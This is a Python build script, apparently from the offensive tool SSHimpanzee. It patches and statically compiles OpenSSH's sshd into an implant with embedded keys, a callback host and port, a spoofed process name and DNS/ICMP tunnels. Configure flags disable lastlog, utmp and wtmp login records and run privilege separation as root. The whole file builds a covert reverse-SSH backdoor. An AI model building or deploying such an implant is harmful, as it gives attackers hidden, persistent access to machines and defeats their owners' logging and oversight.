#!/bin/env python3

import uuid
import os
import os.path
import sys
import socket

from src.data import banner, sshd_header, env_template
from src.args import args, parser
from src.keys import gen_keys, load_keys
from src.cmd  import run_cmd
import tuns.builder 

from subsystems.subsystems import generate_subsystem_string
import subsystems.subsystems

host_priv = ""
host_pub = ""
cli_pub = ""


def build_dep():
    print("[*] First build, Setup dependancies")
    cmd = "cd openssh-portable; git checkout 8241b9c0529228b4b86d88b1a6076fb9f97e4a99; git apply ../patch_openssh.diff; autoreconf"
    print("\t-> Apply patch and run Autoreconf on openssh-portable")
    
    if (run_cmd(cmd)):
        print("[-] Autoreconf failed...")
        sys.exit(-1)
    if not os.path.exists("build"):
        os.mkdir("build")
                
def set_env_code(env_items, template, pattern="<ENV_CODE>"):
    env_code =  ""
    if env_items["if_not_set"]:
        for i in env_items["if_not_set"]:
            value = env_items["if_not_set"][i]
            if type(value) is str:
                value = value.replace('"','\\"')
            key = i
            env_var = f"{key}={value}"
            env_code += f'if (!getenv("{key}")) putenv("{env_var}");\n'

    if env_items["overwrite"]:
        for i in env_items["overwrite"]:
            value = env_items["overwrite"][i]
            if type(value) is str:
                value = value.replace('"','\\"')
            key = i
            env_var = f"{key}={value}"
            env_code += f'putenv("{env_var}");\n'

    to_write = template.replace(pattern, env_code,1)
    return to_write
    
def clean():
    cmd = "cd openssh-portable; git reset eb88d07c43afe407094e7d609248d85a15e148ef --hard; rm -f sshd; rm configure"
    run_cmd(cmd)
    cmd = "git submodule foreach --recursive 'git reset --hard HEAD; git clean -fd'"
    run_cmd(cmd)
    if os.path.exists('build/libtun.a'):
        os.unlink('build/libtun.a')
    if os.path.exists('build/sshd'):
        os.unlink('build/sshd')
    if os.path.exists('build/dns2tcpd'):
        os.unlink('build/dns2tcpd')
    if os.path.exists('build/icmptunnel'):
        os.unlink('build/icmptunnel')



if __name__ == "__main__":
    print(banner)
    if args.tun == "help" or args.tun == "list":
        tuns.builder.help()
        
    if args.force_clean_build:
        clean()
        
    if not os.path.isfile("openssh-portable/configure"):
        build_dep()

    if args.keygen:              
        gen_keys()
    else:
        print("\t-> Skipping Key regen")
    
    print("[*] Load keys")
    host_priv, host_pub, cli_pub = load_keys()
    
    print("[*] Generate uniq Keyfile variable")
    keyfile = str(uuid.uuid1())
    print("\t-> "+keyfile)

    
    CFLAGS_add = ""
    LFLAGS_add = ""

    tun = tuns.builder.combiner(args.tun)
                    
    path = os.getcwd()
    CFLAGS_add = "-DTUN"
    LFLAGS_add = f"-ltun -L{path}/build/"

    extra_conf = ""
    
    subsys_str = generate_subsystem_string(args)
    for i in args.subsystems:
        if args.subsystems[i]['is_internal']:
            ec,el,econf = getattr(subsystems.subsystems, i, None)(args)
            CFLAGS_add += ' ' + ec
            LFLAGS_add += ' ' + el
            extra_conf += ' ' + econf

    configure_command = f'cd openssh-portable; ./configure --without-zlib --disable-lastlog --disable-utmp --disable-utmpx --disable-wtmp --disable-wtmpx --disable-libutil --without-openssl CFLAGS="-D_FORTIFY_SOURCE=0 -static -Os -fPIC {CFLAGS_add}" LDFLAGS=" -static {LFLAGS_add}"  --without-sandbox --with-privsep-user=root --with-privsep-path=/tmp/  --with-pie {extra_conf}' 

    ip  = '"127.0.0.1"'
    port = '8080'
    
            
    if args.reconf:
        print("[*] Running ./configure")
        if(run_cmd(configure_command)):
            print("\n\n[-] Reconfigure FAILED. You might need some static libraries. Build have been tested succesfully on Centos")
            sys.exit(-1)
    else:
        print("\t-> Skipping Reconf")

    sshd_header = sshd_header.replace("<KEYFILE>", keyfile)
    sshd_header = sshd_header.replace("<REMOTE>", ip)
    sshd_header = sshd_header.replace("<PORT>", port)
    sshd_header = sshd_header.replace("<PRIVKEY>", host_priv)
    sshd_header = sshd_header.replace("<PUBKEY>", host_pub)
    sshd_header = sshd_header.replace("<AUTHORIZED_KEYS>", cli_pub)
    sshd_header = sshd_header.replace("<USER_SHELL>", args.shell)
    if args.banner:
        sshd_header = sshd_header.replace("<BANNER>", banner.replace("\\","\\\\").replace("\n","\\n"))
    else :
        sshd_header = sshd_header.replace("<BANNER>", "")
    sshd_header = sshd_header.replace("<TIMER>", args.timer)
    sshd_header = sshd_header.replace("<SSHIMPANZEE_PROC_NAME>", args.process_name)
    sshd_header = sshd_header.replace("<SUBSYSTEMS>", subsys_str)
    sshd_header = sshd_header.replace("<DYN_MODE>", "1")
    sshd_header = sshd_header.replace("<LOGLEVEL>", args.loglevel)

    extra_cfg = ""
    for i in args.sshd_extra_config:
        
        extra_cfg += f"{i} {args.sshd_extra_config[i]}\\n"

    
    sshd_header = sshd_header.replace("<SSHD_CONFIG>", extra_cfg)

    if args.verbose > 0:
        print(sshd_header)

    with open("openssh-portable/sshd.h", "w") as f:
        f.write(sshd_header)

    template = set_env_code(args.env, env_template)
    
    if args.verbose > 0:
        print(template)

    with open("openssh-portable/initial_env.c", "w") as f:
        f.write(template)

    if args.make:
        print("[*] Starting Build... It could take some time.")
        r = run_cmd(f"cd openssh-portable; make clean; make sshd -j $(nproc)");
        if r != 0:
            print("[-] Build FAILED ")
            sys.exit(-r)
        print("[+] Build completed successfully")
        os.replace("openssh-portable/sshd", "build/sshd")
	
